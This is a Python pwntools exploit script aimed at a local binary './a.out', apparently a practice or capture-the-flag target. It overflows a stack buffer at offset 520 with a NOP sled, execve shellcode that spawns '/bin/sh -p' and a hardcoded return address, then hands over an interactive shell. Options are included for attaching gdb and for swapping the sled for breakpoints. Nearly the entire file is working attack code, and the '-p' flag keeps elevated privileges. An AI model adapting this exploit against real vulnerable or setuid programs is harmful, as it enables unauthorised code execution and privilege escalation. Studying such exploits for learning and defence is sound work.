from pwn import *
from pwnlib import *

context.arch = 'amd64'

def main():
    # pattern search -> offset 0 - 0x00007fffffffe060
    # RSP - offset 520
    # Anything we overwrite after it and we get to control RIP
    offset = 520

    # Check for the offset 0 address above - e.g. 0x00007fffffffe060 / 
    # x/100 0x00007fffffffe060
    # Try to locate an area in the nop sled to point RIP to it
    #rip = p64(0x7fffffffe130) # in gdb
    rip = p64(0x7fffffffe0b0) # outside gdb

    shellcode = shellcraft.amd64.linux.execve(path="/bin/sh", argv=["sh", "-p"])
    #shellcode = shellcraft.amd64.linux.sh()
    padding = b""

    #payload = padding + rip + nop_slide + asm.asm(shellcode)

    shell = asm.asm(shellcode, arch='amd64', bits=64)

    nop_size = offset - len(shell)
    if args.args["BREAK"]:
        nop_sled = b"\xCC" * int(nop_size/2)
    else:
        nop_sled = b"\x90" * int(nop_size/2)
    

    padding = b"J" * int(nop_size - nop_size/2)

    payload = nop_sled + shell + padding + rip

    #print(nop_size)
    #print(shellcode)

    if args.args["LOCAL"]:
        sys.stdout.buffer.write(payload)
    else:
        proc = process('./a.out')
        proc.recvline()
        
        if args.args["ATTACH"]:
            elf = ELF('./a.out')
            gdb.debug([elf.path])

        proc.send(payload)
        proc.interactive()

if __name__ == "__main__":
    main()
